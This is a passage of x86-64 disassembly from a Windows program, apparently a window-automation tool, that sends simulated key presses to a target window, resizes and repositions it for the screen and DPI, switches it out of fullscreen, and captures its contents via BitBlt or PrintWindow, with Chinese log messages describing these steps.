000000014000178e  call     qword ptr [rip + 0x6b1c]                         ; 0x1400082b0 USER32.dll!MapVirtualKeyW
0000000140001794  mov      rcx, qword ptr [rip + 0xaa9d]                    ; 0x14000c238
000000014000179b  xor      r9d, r9d                                        
000000014000179e  xor      r8d, r8d                                        
00000001400017a1  mov      ebx, eax                                        
00000001400017a3  lea      edx, [r9 + 7]                                   
00000001400017a7  call     qword ptr [rip + 0x6b3b]                         ; 0x1400082e8 USER32.dll!SendMessageW
00000001400017ad  mov      rcx, qword ptr [rip + 0xaa84]                    ; 0x14000c238
00000001400017b4  mov      r8d, esi                                        
00000001400017b7  shl      ebx, 0x10                                        ; 0x10
00000001400017ba  mov      edx, 0x100                                       ; 0x100
00000001400017bf  mov      r9d, ebx                                        
00000001400017c2  or       r9, 1                                            ; 0x1
00000001400017c6  mov      edi, ebx                                        
00000001400017c8  call     qword ptr [rip + 0x6ada]                         ; 0x1400082a8 USER32.dll!PostMessageW
00000001400017ce  mov      ecx, ebp                                        
00000001400017d0  call     qword ptr [rip + 0x69ea]                         ; 0x1400081c0 KERNEL32.DLL!Sleep
00000001400017d6  mov      rcx, qword ptr [rip + 0xaa5b]                    ; 0x14000c238
00000001400017dd  mov      r9d, 0xc0000001                                  ; 0xc0000001
00000001400017e3  or       r9, rdi                                         
00000001400017e6  mov      r8d, esi                                        
00000001400017e9  mov      edx, 0x101                                       ; 0x101
00000001400017ee  call     qword ptr [rip + 0x6ab4]                         ; 0x1400082a8 USER32.dll!PostMessageW
00000001400017f4  jmp      0x14000181f                                      ; 0x14000181f
00000001400017f6  xor      r9d, r9d                                        
00000001400017f9  xor      r8d, r8d                                        
00000001400017fc  mov      cl, sil                                         
00000001400017ff  call     qword ptr [rip + 0x6ad3]                         ; 0x1400082d8 USER32.dll!keybd_event
0000000140001805  mov      ecx, ebp                                        
0000000140001807  call     qword ptr [rip + 0x69b3]                         ; 0x1400081c0 KERNEL32.DLL!Sleep
000000014000180d  xor      r9d, r9d                                        
0000000140001810  xor      edx, edx                                        
0000000140001812  mov      cl, sil                                         
0000000140001815  lea      r8d, [r9 + 2]                                   
0000000140001819  call     qword ptr [rip + 0x6ab9]                         ; 0x1400082d8 USER32.dll!keybd_event
000000014000181f  add      rsp, 0x28                                        ; 0x28
0000000140001823  pop      rdi                                             
0000000140001824  pop      rsi                                             
0000000140001825  pop      rbp                                             
0000000140001826  pop      rbx                                             
0000000140001827  ret                                                      

; FUNCTION 0x140001828

0000000140001828  push     rbp                                             
000000014000182a  push     rbx                                             
000000014000182b  push     rsi                                             
000000014000182c  push     rdi                                             
000000014000182d  push     r12                                             
000000014000182f  push     r13                                             
0000000140001831  push     r14                                             
0000000140001833  push     r15                                             
0000000140001835  lea      rbp, [rsp - 0x1f]                               
000000014000183a  sub      rsp, 0xa8                                        ; 0xa8
0000000140001841  mov      rax, qword ptr [rip + 0xa7f8]                    ; 0x14000c040
0000000140001848  xor      rax, rsp                                        
000000014000184b  mov      qword ptr [rbp + 0xf], rax                      
000000014000184f  mov      r13b, cl                                        
0000000140001852  mov      rcx, qword ptr [rip + 0xa9df]                    ; 0x14000c238
0000000140001859  call     qword ptr [rip + 0x6ae1]                         ; 0x140008340 USER32.dll!IsIconic
000000014000185f  mov      edi, 1                                           ; 0x1
0000000140001864  test     eax, eax                                        
0000000140001866  je       0x1400018ae                                      ; 0x1400018ae
0000000140001868  mov      rcx, qword ptr [rip + 0xa9c9]                    ; 0x14000c238
000000014000186f  xor      r9d, r9d                                        
0000000140001872  mov      dword ptr [rsp + 0x30], 0x13                     ; 0x13
000000014000187a  xor      r8d, r8d                                        
000000014000187d  mov      dword ptr [rsp + 0x28], 0                        ; 0x0
0000000140001885  mov      edx, edi                                        
0000000140001887  mov      dword ptr [rsp + 0x20], 0                        ; 0x0
000000014000188f  call     qword ptr [rip + 0x6a3b]                         ; 0x1400082d0 USER32.dll!SetWindowPos
0000000140001895  mov      rcx, qword ptr [rip + 0xa99c]                    ; 0x14000c238
000000014000189c  lea      edx, [rdi + 3]                                  
000000014000189f  call     qword ptr [rip + 0x6a5b]                         ; 0x140008300 USER32.dll!ShowWindow
00000001400018a5  lea      ecx, [rdi + 0x63]                               
00000001400018a8  call     qword ptr [rip + 0x6912]                         ; 0x1400081c0 KERNEL32.DLL!Sleep
00000001400018ae  mov      rcx, qword ptr [rip + 0xa983]                    ; 0x14000c238
00000001400018b5  call     qword ptr [rip + 0x6a25]                         ; 0x1400082e0 USER32.dll!GetDpiForWindow
00000001400018bb  xorps    xmm0, xmm0                                      
00000001400018be  mov      eax, eax                                        
00000001400018c0  xor      r12b, r12b                                      
00000001400018c3  cvtsi2ss xmm0, rax                                       
00000001400018c8  divss    xmm0, dword ptr [rip + 0x7adc]                   ; 0x1400093ac
00000001400018d0  ucomiss  xmm0, dword ptr [rip + 0xa7e1]                   ; 0x14000c0b8
00000001400018d7  jp       0x1400018db                                      ; 0x1400018db
00000001400018d9  je       0x1400018f3                                      ; 0x1400018f3
00000001400018db  mov      rcx, 0xfffffffffffffffc                          ; -0x4
00000001400018e2  movss    dword ptr [rip + 0xa7ce], xmm0                   ; 0x14000c0b8
00000001400018ea  mov      r12b, dil                                       
00000001400018ed  call     qword ptr [rip + 0x6a35]                         ; 0x140008328 USER32.dll!SetThreadDpiAwarenessContext
00000001400018f3  xor      ecx, ecx                                        
00000001400018f5  call     qword ptr [rip + 0x69f5]                         ; 0x1400082f0 USER32.dll!GetSystemMetrics
00000001400018fb  mov      ecx, edi                                        
00000001400018fd  mov      ebx, eax                                        
00000001400018ff  call     qword ptr [rip + 0x69eb]                         ; 0x1400082f0 USER32.dll!GetSystemMetrics
0000000140001905  cmp      dword ptr [rip + 0xa919], ebx                    ; 0x14000c224
000000014000190b  jne      0x140001915                                      ; 0x140001915
000000014000190d  cmp      dword ptr [rip + 0xa92d], eax                    ; 0x14000c240
0000000140001913  je       0x140001918                                      ; 0x140001918
0000000140001915  mov      r12b, dil                                       
0000000140001918  mov      rcx, qword ptr [rip + 0xa919]                    ; 0x14000c238
000000014000191f  lea      rdx, [rbp - 1]                                  
0000000140001923  mov      dword ptr [rip + 0xa8fb], ebx                    ; 0x14000c224
0000000140001929  mov      dword ptr [rip + 0xa911], eax                    ; 0x14000c240
000000014000192f  call     qword ptr [rip + 0x69fb]                         ; 0x140008330 USER32.dll!GetClientRect
0000000140001935  cmp      dword ptr [rbp + 0xb], 0                         ; 0x0
0000000140001939  je       0x140001dbd                                      ; 0x140001dbd
000000014000193f  mov      rcx, qword ptr [rip + 0xa8f2]                    ; 0x14000c238
0000000140001946  lea      rdx, [rbp - 0x29]                               
000000014000194a  mov      qword ptr [rbp - 0x29], 0                        ; 0x0
0000000140001952  call     qword ptr [rip + 0x69c0]                         ; 0x140008318 USER32.dll!ClientToScreen
0000000140001958  mov      r9d, dword ptr [rbp + 7]                        
000000014000195c  cmp      dword ptr [rip + 0xa8f1], r9d                    ; 0x14000c254
0000000140001963  mov      r11d, dword ptr [rbp - 0x29]                    
0000000140001967  mov      ebx, dword ptr [rbp - 0x25]                     
000000014000196a  mov      r8d, dword ptr [rbp + 0xb]                      
000000014000196e  mov      dword ptr [rip + 0xa8b7], r11d                   ; 0x14000c22c
0000000140001975  mov      dword ptr [rip + 0xa8d1], ebx                    ; 0x14000c24c
000000014000197b  jne      0x140001986                                      ; 0x140001986
000000014000197d  cmp      dword ptr [rip + 0xa8f8], r8d                    ; 0x14000c27c
0000000140001984  je       0x140001989                                      ; 0x140001989
0000000140001986  mov      r12b, dil                                       
0000000140001989  mov      r15d, dword ptr [rip + 0xa894]                   ; 0x14000c224
0000000140001990  cmp      r9d, r15d                                       
0000000140001993  jle      0x140001a85                                      ; 0x140001a85
0000000140001999  mov      r14, qword ptr [rip + 0xa898]                    ; 0x14000c238
00000001400019a0  mov      edx, 0xfffffff0                                  ; 0xfffffff0
00000001400019a5  movd     xmm0, r15d                                      
00000001400019aa  mov      rcx, r14                                        
00000001400019ad  cvtdq2pd xmm0, xmm0                                      
00000001400019b1  mov      dword ptr [rip + 0xa89c], r15d                   ; 0x14000c254
00000001400019b8  mulsd    xmm0, qword ptr [rip + 0x7848]                   ; 0x140009208
00000001400019c0  mulsd    xmm0, qword ptr [rip + 0x7980]                   ; 0x140009348
00000001400019c8  cvttsd2si esi, xmm0                                       
00000001400019cc  mov      dword ptr [rip + 0xa8aa], esi                    ; 0x14000c27c
00000001400019d2  call     qword ptr [rip + 0x68b8]                         ; 0x140008290 USER32.dll!GetWindowLongW
00000001400019d8  mov      edx, 0xffffffec                                  ; 0xffffffec
00000001400019dd  mov      rcx, r14                                        
00000001400019e0  mov      edi, eax                                        
00000001400019e2  call     qword ptr [rip + 0x68a8]                         ; 0x140008290 USER32.dll!GetWindowLongW
00000001400019e8  mov      rcx, r14                                        
00000001400019eb  mov      ebx, eax                                        
00000001400019ed  call     qword ptr [rip + 0x68c5]                         ; 0x1400082b8 USER32.dll!GetMenu
00000001400019f3  xor      r8d, r8d                                        
00000001400019f6  mov      qword ptr [rbp - 0x21], 0                        ; 0x0
00000001400019fe  test     rax, rax                                        
0000000140001a01  mov      dword ptr [rbp - 0x19], r15d                    
0000000140001a05  mov      r9d, ebx                                        
0000000140001a08  mov      dword ptr [rbp - 0x15], esi                     
0000000140001a0b  setne    r8b                                             
0000000140001a0f  lea      rcx, [rbp - 0x21]                               
0000000140001a13  mov      edx, edi                                        
0000000140001a15  call     qword ptr [rip + 0x6885]                         ; 0x1400082a0 USER32.dll!AdjustWindowRectEx
0000000140001a1b  mov      edx, dword ptr [rbp - 0x15]                     
0000000140001a1e  xor      r9d, r9d                                        
0000000140001a21  sub      edx, dword ptr [rbp - 0x1d]                     
0000000140001a24  xor      r8d, r8d                                        
0000000140001a27  mov      eax, dword ptr [rbp - 0x19]                     
0000000140001a2a  mov      rcx, r14                                        
0000000140001a2d  sub      eax, dword ptr [rbp - 0x21]                     
0000000140001a30  mov      dword ptr [rsp + 0x30], 0x16                     ; 0x16
0000000140001a38  mov      dword ptr [rsp + 0x28], edx                     
0000000140001a3c  xor      edx, edx                                        
0000000140001a3e  mov      dword ptr [rsp + 0x20], eax                     
0000000140001a42  call     qword ptr [rip + 0x6888]                         ; 0x1400082d0 USER32.dll!SetWindowPos
0000000140001a48  mov      r8d, dword ptr [rip + 0xa82d]                    ; 0x14000c27c
0000000140001a4f  lea      rcx, [rip + 0x6d12]                              ; 0x140008768 "检测到窗口宽度超出屏幕宽度，设置窗口宽高：%d, %d"
0000000140001a56  mov      edx, dword ptr [rip + 0xa7f8]                    ; 0x14000c254
0000000140001a5c  call     0x140001474                                      ; 0x140001474
0000000140001a61  mov      r11d, dword ptr [rip + 0xa7c4]                   ; 0x14000c22c
0000000140001a68  mov      r9d, dword ptr [rip + 0xa7e5]                    ; 0x14000c254
0000000140001a6f  mov      r8d, dword ptr [rip + 0xa806]                    ; 0x14000c27c
0000000140001a76  mov      r15d, dword ptr [rip + 0xa7a7]                   ; 0x14000c224
0000000140001a7d  mov      ebx, dword ptr [rip + 0xa7c9]                    ; 0x14000c24c
0000000140001a83  jmp      0x140001a93                                      ; 0x140001a93
0000000140001a85  mov      dword ptr [rip + 0xa7c8], r9d                    ; 0x14000c254
0000000140001a8c  mov      dword ptr [rip + 0xa7e9], r8d                    ; 0x14000c27c
0000000140001a93  movd     xmm3, r8d                                       
0000000140001a98  cvtdq2pd xmm3, xmm3                                      
0000000140001a9c  movd     xmm2, r9d                                       
0000000140001aa1  movaps   xmm1, xmm3                                      
0000000140001aa4  mulsd    xmm1, qword ptr [rip + 0x78ac]                   ; 0x140009358
0000000140001aac  cvtdq2pd xmm2, xmm2                                      
0000000140001ab0  divsd    xmm1, qword ptr [rip + 0x7890]                   ; 0x140009348
0000000140001ab8  movaps   xmm0, xmm2                                      
0000000140001abb  subsd    xmm0, xmm1                                      
0000000140001abf  cvttsd2si esi, xmm1                                       
0000000140001ac3  cvttsd2si eax, xmm0                                       
0000000140001ac7  mov      dword ptr [rip + 0xa75b], esi                    ; 0x14000c228
0000000140001acd  cdq                                                      
0000000140001ace  sub      eax, edx                                        
0000000140001ad0  sar      eax, 1                                           ; 0x1
0000000140001ad2  mov      r14d, eax                                       
0000000140001ad5  mov      dword ptr [rip + 0xa755], eax                    ; 0x14000c230
0000000140001adb  jns      0x140001b1c                                      ; 0x140001b1c
0000000140001add  mulsd    xmm2, qword ptr [rip + 0x7723]                   ; 0x140009208
0000000140001ae5  xor      r14d, r14d                                      
0000000140001ae8  mov      esi, r9d                                        
0000000140001aeb  mov      dword ptr [rip + 0xa736], r9d                    ; 0x14000c228
0000000140001af2  mov      dword ptr [rip + 0xa737], r14d                   ; 0x14000c230
0000000140001af9  mulsd    xmm2, qword ptr [rip + 0x7847]                   ; 0x140009348
0000000140001b01  subsd    xmm3, xmm2                                      
0000000140001b05  cvttsd2si edi, xmm2                                       
0000000140001b09  cvttsd2si eax, xmm3                                       
0000000140001b0d  mov      dword ptr [rip + 0xa731], edi                    ; 0x14000c244
0000000140001b13  cdq                                                      
0000000140001b14  sub      eax, edx                                        
0000000140001b16  sar      eax, 1                                           ; 0x1
0000000140001b18  mov      edx, eax                                        
0000000140001b1a  jmp      0x140001b28                                      ; 0x140001b28
0000000140001b1c  mov      edi, r8d                                        
0000000140001b1f  mov      dword ptr [rip + 0xa71e], r8d                    ; 0x14000c244
0000000140001b26  xor      edx, edx                                        
0000000140001b28  mov      r10d, dword ptr [rip + 0xa711]                   ; 0x14000c240
0000000140001b2f  mov      dword ptr [rip + 0xa743], edx                    ; 0x14000c278
0000000140001b35  cmp      r15d, 0x400                                      ; 0x400
0000000140001b3c  jl       0x140001c9a                                      ; 0x140001c9a
0000000140001b42  lea      eax, [r9 + r11]                                 
0000000140001b46  cmp      eax, r15d                                       
0000000140001b49  jg       0x140001b61                                      ; 0x140001b61
0000000140001b4b  lea      ecx, [r8 + rbx]                                 
0000000140001b4f  cmp      ecx, r10d                                       
0000000140001b52  jg       0x140001b61                                      ; 0x140001b61
0000000140001b54  test     r11d, r11d                                      
0000000140001b57  js       0x140001b61                                      ; 0x140001b61
0000000140001b59  test     ebx, ebx                                        
0000000140001b5b  jns      0x140001c9a                                      ; 0x140001c9a
0000000140001b61  mov      rsi, qword ptr [rip + 0xa6d0]                    ; 0x14000c238
0000000140001b68  sub      r15d, r9d                                       
0000000140001b6b  mov      eax, r15d                                       
0000000140001b6e  sub      r10d, r8d                                       
0000000140001b71  cdq                                                      
0000000140001b72  mov      rcx, rsi                                        
0000000140001b75  sub      eax, edx                                        
0000000140001b77  sar      eax, 1                                           ; 0x1
0000000140001b79  mov      r14d, eax                                       
0000000140001b7c  mov      eax, r10d                                       
0000000140001b7f  cdq                                                      
0000000140001b80  sub      eax, edx                                        
0000000140001b82  lea      rdx, [rbp - 0x11]                               
0000000140001b86  sar      eax, 1                                           ; 0x1
0000000140001b88  mov      r15d, eax                                       
0000000140001b8b  call     qword ptr [rip + 0x679f]                         ; 0x140008330 USER32.dll!GetClientRect
0000000140001b91  test     eax, eax                                        
0000000140001b93  je       0x140001c26                                      ; 0x140001c26
0000000140001b99  mov      ecx, dword ptr [rbp - 9]                        
0000000140001b9c  mov      edx, 0xfffffff0                                  ; 0xfffffff0
0000000140001ba1  sub      ecx, dword ptr [rbp - 0x11]                     
0000000140001ba4  mov      eax, dword ptr [rbp - 5]                        
0000000140001ba7  add      ecx, r14d                                       
0000000140001baa  sub      eax, dword ptr [rbp - 0xd]                      
0000000140001bad  mov      dword ptr [rbp - 0x19], ecx                     
0000000140001bb0  add      eax, r15d                                       
0000000140001bb3  mov      rcx, rsi                                        
0000000140001bb6  mov      dword ptr [rbp - 0x21], r14d                    
0000000140001bba  mov      dword ptr [rbp - 0x1d], r15d                    
0000000140001bbe  mov      dword ptr [rbp - 0x15], eax                     
0000000140001bc1  call     qword ptr [rip + 0x66c9]                         ; 0x140008290 USER32.dll!GetWindowLongW
0000000140001bc7  mov      edx, 0xffffffec                                  ; 0xffffffec
0000000140001bcc  mov      rcx, rsi                                        
0000000140001bcf  mov      edi, eax                                        
0000000140001bd1  call     qword ptr [rip + 0x66b9]                         ; 0x140008290 USER32.dll!GetWindowLongW
0000000140001bd7  mov      rcx, rsi                                        
0000000140001bda  mov      ebx, eax                                        
0000000140001bdc  call     qword ptr [rip + 0x66d6]                         ; 0x1400082b8 USER32.dll!GetMenu
0000000140001be2  xor      r8d, r8d                                        
0000000140001be5  lea      rcx, [rbp - 0x21]                               
0000000140001be9  test     rax, rax                                        
0000000140001bec  mov      r9d, ebx                                        
0000000140001bef  mov      edx, edi                                        
0000000140001bf1  setne    r8b                                             
0000000140001bf5  call     qword ptr [rip + 0x66a5]                         ; 0x1400082a0 USER32.dll!AdjustWindowRectEx
0000000140001bfb  mov      r9d, dword ptr [rbp - 0x1d]                     
0000000140001bff  xor      edx, edx                                        
0000000140001c01  mov      r8d, dword ptr [rbp - 0x21]                     
0000000140001c05  mov      rcx, rsi                                        
0000000140001c08  mov      dword ptr [rsp + 0x30], 0x15                     ; 0x15
0000000140001c10  mov      dword ptr [rsp + 0x28], 0                        ; 0x0
0000000140001c18  mov      dword ptr [rsp + 0x20], 0                        ; 0x0
0000000140001c20  call     qword ptr [rip + 0x66aa]                         ; 0x1400082d0 USER32.dll!SetWindowPos
0000000140001c26  mov      r8d, r15d                                       
0000000140001c29  lea      rcx, [rip + 0x6b70]                              ; 0x1400087a0 "检测到窗口位置超出屏幕边界，设置窗口位置：%d, %d"
0000000140001c30  mov      edx, r14d                                       
0000000140001c33  call     0x140001474                                      ; 0x140001474
0000000140001c38  mov      rcx, qword ptr [rip + 0xa5f9]                    ; 0x14000c238
0000000140001c3f  lea      rdx, [rbp - 0x29]                               
0000000140001c43  mov      qword ptr [rbp - 0x29], 0                        ; 0x0
0000000140001c4b  call     qword ptr [rip + 0x66c7]                         ; 0x140008318 USER32.dll!ClientToScreen
0000000140001c51  mov      r11d, dword ptr [rbp - 0x29]                    
0000000140001c55  mov      ebx, dword ptr [rbp - 0x25]                     
0000000140001c58  mov      r15d, dword ptr [rip + 0xa5c5]                   ; 0x14000c224
0000000140001c5f  mov      r10d, dword ptr [rip + 0xa5da]                   ; 0x14000c240
0000000140001c66  mov      r9d, dword ptr [rip + 0xa5e7]                    ; 0x14000c254
0000000140001c6d  mov      r8d, dword ptr [rip + 0xa608]                    ; 0x14000c27c
0000000140001c74  mov      esi, dword ptr [rip + 0xa5ae]                    ; 0x14000c228
0000000140001c7a  mov      r14d, dword ptr [rip + 0xa5af]                   ; 0x14000c230
0000000140001c81  mov      edi, dword ptr [rip + 0xa5bd]                    ; 0x14000c244
0000000140001c87  mov      edx, dword ptr [rip + 0xa5eb]                    ; 0x14000c278
0000000140001c8d  mov      dword ptr [rip + 0xa598], r11d                   ; 0x14000c22c
0000000140001c94  mov      dword ptr [rip + 0xa5b2], ebx                    ; 0x14000c24c
0000000140001c9a  test     r13b, r13b                                      
0000000140001c9d  je       0x140001dbd                                      ; 0x140001dbd
0000000140001ca3  test     r12b, r12b                                      
0000000140001ca6  je       0x140001dbd                                      ; 0x140001dbd
0000000140001cac  movss    xmm0, dword ptr [rip + 0xa404]                   ; 0x14000c0b8
0000000140001cb4  lea      rcx, [rip + 0x6b25]                              ; 0x1400087e0 "窗口位置：%d, %d 宽高：%d, %d 黑边：%d, %d, %d, %d 缩放：%0.2f 屏幕：%d, %d"
0000000140001cbb  mov      dword ptr [rsp + 0x58], r10d                    
0000000140001cc0  mov      dword ptr [rsp + 0x50], r15d                    
0000000140001cc5  cvtps2pd xmm0, xmm0                                      
0000000140001cc8  movsd    qword ptr [rsp + 0x48], xmm0                    
0000000140001cce  mov      dword ptr [rsp + 0x40], edx                     
0000000140001cd2  mov      edx, r11d                                       
0000000140001cd5  mov      dword ptr [rsp + 0x38], edi                     
0000000140001cd9  mov      dword ptr [rsp + 0x30], r14d                    
0000000140001cde  mov      dword ptr [rsp + 0x28], esi                     
0000000140001ce2  mov      dword ptr [rsp + 0x20], r8d                     
0000000140001ce7  mov      r8d, ebx                                        
0000000140001cea  call     0x140001474                                      ; 0x140001474
0000000140001cef  mov      eax, dword ptr [rip + 0xa52f]                    ; 0x14000c224
0000000140001cf5  cmp      dword ptr [rip + 0xa559], eax                    ; 0x14000c254
0000000140001cfb  jne      0x140001dbd                                      ; 0x140001dbd
0000000140001d01  mov      eax, dword ptr [rip + 0xa539]                    ; 0x14000c240
0000000140001d07  cmp      dword ptr [rip + 0xa56f], eax                    ; 0x14000c27c
0000000140001d0d  jne      0x140001dbd                                      ; 0x140001dbd
0000000140001d13  lea      rcx, [rip + 0x6a2e]                              ; 0x140008748 "检测到全屏窗口，切到窗口模式。"
0000000140001d1a  call     0x140001474                                      ; 0x140001474
0000000140001d1f  xor      ebx, ebx                                        
0000000140001d21  mov      esi, 0xcf0000                                    ; 0xcf0000
0000000140001d26  mov      r15d, 0x104                                      ; 0x104
0000000140001d2c  lea      r14d, [rbx + 0x12]                              
0000000140001d30  mov      rcx, qword ptr [rip + 0xa501]                    ; 0x14000c238
0000000140001d37  xor      r9d, r9d                                        
0000000140001d3a  mov      r8, r14                                         
0000000140001d3d  mov      edx, r15d                                       
0000000140001d40  call     qword ptr [rip + 0x6562]                         ; 0x1400082a8 USER32.dll!PostMessageW
0000000140001d46  mov      rcx, qword ptr [rip + 0xa4eb]                    ; 0x14000c238
0000000140001d4d  xor      r9d, r9d                                        
0000000140001d50  mov      edx, r15d                                       
0000000140001d53  lea      r8d, [r9 + 0xd]                                 
0000000140001d57  call     qword ptr [rip + 0x654b]                         ; 0x1400082a8 USER32.dll!PostMessageW
0000000140001d5d  mov      rcx, qword ptr [rip + 0xa4d4]                    ; 0x14000c238
0000000140001d64  xor      r9d, r9d                                        
0000000140001d67  mov      r8, r14                                         
0000000140001d6a  mov      edx, 0x105                                       ; 0x105
0000000140001d6f  call     qword ptr [rip + 0x6533]                         ; 0x1400082a8 USER32.dll!PostMessageW
0000000140001d75  call     qword ptr [rip + 0x67d5]                         ; 0x140008550 api-ms-win-crt-time-l1-1-0.dll!clock
0000000140001d7b  lea      edi, [rax + 0xbb8]                              
0000000140001d81  mov      ecx, 0x64                                        ; 0x64
0000000140001d86  call     qword ptr [rip + 0x6434]                         ; 0x1400081c0 KERNEL32.DLL!Sleep
0000000140001d8c  mov      rcx, qword ptr [rip + 0xa4a5]                    ; 0x14000c238
0000000140001d93  mov      edx, 0xfffffff0                                  ; 0xfffffff0
0000000140001d98  call     qword ptr [rip + 0x655a]                         ; 0x1400082f8 USER32.dll!GetWindowLongPtrW
0000000140001d9e  and      rax, rsi                                        
0000000140001da1  cmp      rax, rsi                                        
0000000140001da4  je       0x140001dbd                                      ; 0x140001dbd
0000000140001da6  call     qword ptr [rip + 0x67a4]                         ; 0x140008550 api-ms-win-crt-time-l1-1-0.dll!clock
0000000140001dac  cmp      eax, edi                                        
0000000140001dae  jl       0x140001d81                                      ; 0x140001d81
0000000140001db0  inc      rbx                                             
0000000140001db3  cmp      rbx, 5                                           ; 0x5
0000000140001db7  jb       0x140001d30                                      ; 0x140001d30
0000000140001dbd  mov      rcx, qword ptr [rbp + 0xf]                      
0000000140001dc1  xor      rcx, rsp                                        
0000000140001dc4  call     0x1400062f0                                      ; 0x1400062f0
0000000140001dc9  add      rsp, 0xa8                                        ; 0xa8
0000000140001dd0  pop      r15                                             
0000000140001dd2  pop      r14                                             
0000000140001dd4  pop      r13                                             
0000000140001dd6  pop      r12                                             
0000000140001dd8  pop      rdi                                             
0000000140001dd9  pop      rsi                                             
0000000140001dda  pop      rbx                                             
0000000140001ddb  pop      rbp                                             
0000000140001ddc  ret                                                      
0000000140001ddd  int3                                                     
0000000140001dde  int3                                                     
0000000140001ddf  int3                                                     

; FUNCTION 0x140001de0

0000000140001de0  mov      qword ptr [rsp + 8], rbx                        
0000000140001de5  mov      qword ptr [rsp + 0x18], rbp                     
0000000140001dea  push     rsi                                             
0000000140001deb  push     rdi                                             
0000000140001dec  push     r13                                             
0000000140001dee  push     r14                                             
0000000140001df0  push     r15                                             
0000000140001df2  sub      rsp, 0x90                                        ; 0x90
0000000140001df9  mov      rax, qword ptr [rip + 0xa240]                    ; 0x14000c040
0000000140001e00  xor      rax, rsp                                        
0000000140001e03  mov      qword ptr [rsp + 0x80], rax                     
0000000140001e0b  mov      rcx, qword ptr [rip + 0xa44e]                    ; 0x14000c260
0000000140001e12  mov      esi, r8d                                        
0000000140001e15  mov      r14, rdx                                        
0000000140001e18  test     rcx, rcx                                        
0000000140001e1b  je       0x140001e2e                                      ; 0x140001e2e
0000000140001e1d  call     qword ptr [rip + 0x6225]                         ; 0x140008048 GDI32.dll!DeleteObject
0000000140001e23  mov      qword ptr [rip + 0xa432], 0                      ; 0x14000c260 | 0x0
0000000140001e2e  mov      rcx, r14                                        
0000000140001e31  mov      qword ptr [rip + 0xa41c], 0                      ; 0x14000c258 | 0x0
0000000140001e3c  call     qword ptr [rip + 0x647e]                         ; 0x1400082c0 USER32.dll!GetDC
0000000140001e42  mov      rdi, rax                                        
0000000140001e45  test     rax, rax                                        
0000000140001e48  je       0x140001f9c                                      ; 0x140001f9c
0000000140001e4e  mov      rcx, rax                                        
0000000140001e51  xor      ebp, ebp                                        
0000000140001e53  call     qword ptr [rip + 0x61cf]                         ; 0x140008028 GDI32.dll!CreateCompatibleDC
0000000140001e59  lea      r13d, [rbp + 1]                                 
0000000140001e5d  mov      rbx, rax                                        
0000000140001e60  test     rax, rax                                        
0000000140001e63  je       0x140001f87                                      ; 0x140001f87
0000000140001e69  mov      ecx, dword ptr [rip + 0xa3e5]                    ; 0x14000c254
0000000140001e6f  lea      r9, [rip + 0xa3e2]                               ; 0x14000c258
0000000140001e76  mov      dword ptr [rsp + 0x54], ecx                     
0000000140001e7a  lea      rdx, [rsp + 0x50]                               
0000000140001e7f  mov      ecx, dword ptr [rip + 0xa3f7]                    ; 0x14000c27c
0000000140001e85  xorps    xmm0, xmm0                                      
0000000140001e88  neg      ecx                                             
0000000140001e8a  mov      dword ptr [rsp + 0x28], ebp                     
0000000140001e8e  mov      dword ptr [rsp + 0x58], ecx                     
0000000140001e92  xor      r8d, r8d                                        
0000000140001e95  mov      rcx, rdi                                        
0000000140001e98  mov      qword ptr [rsp + 0x74], rbp                     
0000000140001e9d  movdqu   xmmword ptr [rsp + 0x64], xmm0                  
0000000140001ea3  mov      dword ptr [rsp + 0x50], 0x28                     ; 0x28
0000000140001eab  mov      qword ptr [rsp + 0x5c], 0x200001                 ; 0x200001
0000000140001eb4  mov      qword ptr [rsp + 0x20], rbp                     
0000000140001eb9  call     qword ptr [rip + 0x6181]                         ; 0x140008040 GDI32.dll!CreateDIBSection
0000000140001ebf  mov      qword ptr [rip + 0xa39a], rax                    ; 0x14000c260
0000000140001ec6  test     rax, rax                                        
0000000140001ec9  je       0x140001f7e                                      ; 0x140001f7e
0000000140001ecf  cmp      qword ptr [rip + 0xa382], rbp                    ; 0x14000c258
0000000140001ed6  je       0x140001f7e                                      ; 0x140001f7e
0000000140001edc  mov      rdx, rax                                        
0000000140001edf  mov      rcx, rbx                                        
0000000140001ee2  call     qword ptr [rip + 0x6150]                         ; 0x140008038 GDI32.dll!SelectObject
0000000140001ee8  mov      r15, rax                                        
0000000140001eeb  test     esi, esi                                        
0000000140001eed  jne      0x140001f31                                      ; 0x140001f31
0000000140001eef  mov      ecx, dword ptr [rip + 0xa357]                    ; 0x14000c24c
0000000140001ef5  mov      dword ptr [rsp + 0x40], 0xcc0020                 ; 0xcc0020
0000000140001efd  mov      dword ptr [rsp + 0x38], ecx                     
0000000140001f01  mov      ecx, dword ptr [rip + 0xa325]                    ; 0x14000c22c
0000000140001f07  mov      dword ptr [rsp + 0x30], ecx                     
0000000140001f0b  mov      ecx, dword ptr [rip + 0xa36b]                    ; 0x14000c27c
0000000140001f11  mov      qword ptr [rsp + 0x28], rdi                     
0000000140001f16  mov      dword ptr [rsp + 0x20], ecx                     
0000000140001f1a  mov      r9d, dword ptr [rip + 0xa333]                    ; 0x14000c254
0000000140001f21  xor      r8d, r8d                                        
0000000140001f24  xor      edx, edx                                        
0000000140001f26  mov      rcx, rbx                                        
0000000140001f29  call     qword ptr [rip + 0x60f1]                         ; 0x140008020 GDI32.dll!BitBlt
0000000140001f2f  jmp      0x140001f70                                      ; 0x140001f70
0000000140001f31  cmp      esi, r13d                                       
0000000140001f34  jne      0x140001f57                                      ; 0x140001f57
0000000140001f36  mov      eax, dword ptr [rip + 0xa340]                    ; 0x14000c27c
0000000140001f3c  mov      dword ptr [rsp + 0x40], 0xcc0020                 ; 0xcc0020
0000000140001f44  mov      dword ptr [rsp + 0x38], ebp                     
0000000140001f48  mov      dword ptr [rsp + 0x30], ebp                     
0000000140001f4c  mov      qword ptr [rsp + 0x28], rdi                     
0000000140001f51  mov      dword ptr [rsp + 0x20], eax                     
0000000140001f55  jmp      0x140001f1a                                      ; 0x140001f1a
0000000140001f57  cmp      esi, 2                                           ; 0x2
0000000140001f5a  jne      0x140001f72                                      ; 0x140001f72
0000000140001f5c  mov      rcx, qword ptr [rip + 0xa2d5]                    ; 0x14000c238
0000000140001f63  lea      r8d, [rsi + 1]                                  
0000000140001f67  mov      rdx, rbx                                        
0000000140001f6a  call     qword ptr [rip + 0x63b0]                         ; 0x140008320 USER32.dll!PrintWindow
0000000140001f70  mov      ebp, eax                                        
0000000140001f72  mov      rdx, r15                                        
0000000140001f75  mov      rcx, rbx                                        
0000000140001f78  call     qword ptr [rip + 0x60ba]                         ; 0x140008038 GDI32.dll!SelectObject
0000000140001f7e  mov      rcx, rbx                                        
